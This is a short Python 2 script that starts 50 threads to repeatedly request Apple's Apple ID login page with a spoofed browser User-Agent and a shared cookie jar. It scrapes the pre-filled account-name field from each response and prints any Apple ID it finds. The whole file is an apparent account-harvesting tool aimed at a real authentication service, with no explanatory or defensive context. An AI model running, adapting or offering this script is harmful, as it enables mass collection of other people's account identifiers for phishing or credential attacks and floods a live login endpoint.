from bs4 import BeautifulSoup
from threading import Thread
import cookielib
import requests

APPLE_URL = 'https://idmsa.apple.com/IDMSWebAuth/login.html?' \
            'appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3&path=/signin/'
HEADERS = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:27.0) Gecko/20100101 Firefox/27.0'}
COOKIE_JAR = cookielib.CookieJar()
THREADS = 50

def apple_id_generator():
    while True:
        res = requests.get(APPLE_URL, cookies=COOKIE_JAR, headers=HEADERS)
        soup = BeautifulSoup(res.content, "html.parser")
        account_id = soup.find('input', {'id': 'accountname'}).get('value')
        if account_id:
            print account_id
            
def main():
    for _ in range(THREADS):
        t = Thread(target=apple_id_generator)
        t.daemon = True
        t.start()

    while True:
        pass

if __name__ == '__main__':
    main()